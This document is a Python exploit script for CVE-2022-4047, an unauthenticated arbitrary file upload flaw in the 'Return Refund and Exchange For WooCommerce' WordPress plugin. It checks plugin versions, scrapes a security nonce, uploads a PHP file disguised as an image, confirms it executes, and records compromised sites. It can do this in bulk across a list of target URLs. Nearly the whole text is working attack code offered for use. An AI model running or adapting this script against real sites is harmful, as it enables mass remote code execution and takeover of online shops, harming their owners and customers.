import re
import requests
import random
import argparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class VulnerabilityScanner:
    def __init__(self, vuln_version="4.0.9"):
        self.vuln_version = vuln_version
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'https://127.0.0.1:8080',
        }
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36"
        }

    def read_target_urls(self, file):
        with open(file, 'r') as file:
            return [line.strip() for line in file]

    def check_version_vulnerability(self, target, readme_url):
        try:
            response = requests.get(readme_url, headers=self.headers, timeout=(10, 10), verify=False, allow_redirects=False, proxies=self.proxies)
            version = re.search(r'Stable tag: (\S+)', response.text).group(1) if 'Stable tag:' in response.text else None
            
            if response.status_code != 200 or version is None or version > self.vuln_version:
                return False, version
            return True, version

        except Exception as e:
            print(target, f"not vuln: {str(e)}")
            return False

    def extract_nonce(self, target):
        try:
            response = requests.get(target, headers=self.headers, verify=False, proxies=self.proxies)
            nonce = re.search(r'wps_rma_nonce":"([^"]+)"', response.text).group(1)
            return nonce
        except Exception as e:
            print(target, f"not vuln: {str(e)}")
            return None

    def exploit_vulnerability(self, target, nonce):
        prefix = ''.join(random.choice('0123456789') for _ in range(6))
        files = {'wps_rma_return_request_files[]': ('testing.php', open('testing.php', 'r'), 'image/jpeg')}
        data = {'wps_rma_return_request_order': prefix}
        url = f"{target}/wp-admin/admin-ajax.php?action=wps_rma_return_upload_files&security_check={nonce}"

        response = requests.post(url, files=files, data=data, timeout=(10, 10), headers=self.headers, verify=False, proxies=self.proxies)

        if 'success' in response.text:
            response = requests.get(f"{target}/wp-content/attachment/{prefix}-testing.php")
            if "phpinfo" in response.text:
                print(f"Vuln! Uploaded | Filename: {prefix}-testing.php | {target}/wp-content/attachment/{prefix}-testing.php")
                with open('vuln.txt', 'a') as f:
                    f.write(target + '\n')
                with open('uploaded.txt', 'a') as f:
                    f.write(f"{target}/wp-content/attachment/{prefix}-testing.php\n")
            else:
                print(target, "not vuln")
                with open('notvuln.txt', 'a') as f:
                    f.write(target + '\n')
        else:
            print(target, "not upload")
            with open('notvuln.txt', 'a') as f:
                f.write(target + '\n')

    def check_and_exploit(self, target):
        readme_url = f"{target}/wp-content/plugins/woo-refund-and-exchange-lite/readme.txt"
        result, version = self.check_version_vulnerability(target, readme_url)

        if result:
            print(target, "version:", version, "<= 4.0.9")
            nonce = self.extract_nonce(target)
            if nonce:
                self.exploit_vulnerability(target, nonce)
            else:
                print(target, "not vuln")
        else:
            print(target, "version not vuln")

    def scan_vulnerabilities(self, file):
        target_urls = self.read_target_urls(file)

        for target in target_urls:
            self.check_and_exploit(target)

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2022-4047 - Return Refund and Exchange For WooCommerce | Return Refund and Exchange For WooCommerce < 4.0.9 - Unauthenticated Arbitrary File Upload (Mass PHP File Upload)"
    )

    parser.add_argument("-u", "--url", help="url", default=None)
    parser.add_argument("-f", "--file", help="url list", default=None)

    args = parser.parse_args()
    scanner = VulnerabilityScanner()

    if args.url:
        scanner.check_and_exploit(args.url)
    elif args.file:
        scanner.scan_vulnerabilities(args.file)

if __name__ == "__main__":
    main()
